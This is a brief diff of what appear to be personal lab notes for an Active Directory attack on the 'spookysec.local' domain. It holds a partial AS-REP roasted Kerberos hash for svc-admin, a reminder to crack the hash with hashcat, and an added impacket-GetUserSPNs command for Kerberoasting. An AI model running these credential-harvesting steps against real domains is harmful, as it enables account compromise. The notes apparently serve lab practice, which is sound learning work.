@@ -8,9 +8,9 @@ $krb5asrep$23$svc-admin@SPOOKYSEC.LOCAL:bd4b3ef4f7baf60c5a075f58cd8d220a$a2ddbf9
 
 (always copy full as hash to crack with hashcat)
 
----------------------------------------------------------------------------------------
+---------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 
-
+impacket-GetUserSPNs spookysec.local/svc-admin:password -dc-ip 10.201.30.111 -request                            (This will list the SPN enabled user along with its hash)
 
 
 
